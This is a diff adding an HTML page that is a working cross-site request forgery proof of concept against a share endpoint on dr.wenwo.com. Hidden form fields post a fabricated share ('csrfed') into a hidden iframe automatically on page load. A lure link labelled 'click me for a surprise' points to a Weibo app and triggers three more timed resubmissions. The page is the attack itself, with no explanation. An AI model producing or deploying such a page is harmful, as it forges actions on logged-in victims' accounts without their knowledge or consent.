@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    </head>
+    <body>
+        <a id="aiwen_href" target="_blank" href="http://apps.weibo.com/5076516542/8s0ZkcjX">点我有惊喜</a>
+        <form id="form_csrf" target="iframe_csrf" action="http://dr.wenwo.com/popular/indexActivityshare" method="POST">
+            <input type="hidden" name="zttitle" value="csrfed" />
+            <input type="hidden" name="intro" value="csrf" />
+            <input type="hidden" name="shareType" value="zhuantiList" />
+            <input type="hidden" name="ztid" value="56c5725c0cf2c8ccfb4a8d90" />
+        </form>
+        
+        <iframe id="iframe_csrf" name="iframe_csrf" width="500px" height="600px"></iframe>
+        <script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+        <script type="text/javascript">
+
+        
+        $(function() {
+            $("#form_csrf").submit();
+            $("#aiwen_href").click(function() {
+                setTimeout(function() {
+                    $("#form_csrf").submit()
+                }, 2000);
+                
+                setTimeout(function() {
+                    $("#form_csrf").submit()
+                }, 5000);
+
+                setTimeout(function() {
+                    $("#form_csrf").submit()
+                }, 10000);
+                
+            });
+            
+        })
+        </script>
+    </body>
+</html>
